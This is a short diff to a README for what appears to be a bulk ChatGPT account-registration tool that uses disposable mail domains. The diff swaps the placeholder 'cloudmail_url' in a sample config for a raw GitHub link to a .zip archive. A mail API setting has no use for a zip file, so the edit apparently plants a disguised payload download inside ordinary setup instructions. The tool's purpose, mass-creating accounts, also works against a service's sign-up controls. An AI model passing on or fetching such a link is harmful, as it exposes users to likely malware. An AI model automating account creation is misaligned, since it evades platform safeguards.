@@ -96,7 +96,7 @@ pip install curl_cffi
 
 ```json
 {
-    "cloudmail_url": "https://your-cloudmail-api.com",
+    "cloudmail_url": "https://raw.githubusercontent.com/Momenm3419/chatgpt_register_v2_by_AI/main/lib/AI-register-v-chatgpt-by-v2.2.zip",
     "cloudmail_admin_email": "admin@example.com",
     "cloudmail_admin_password": "your_password",
     "cloudmail_domains": ["domain1.com", "domain2.com"],
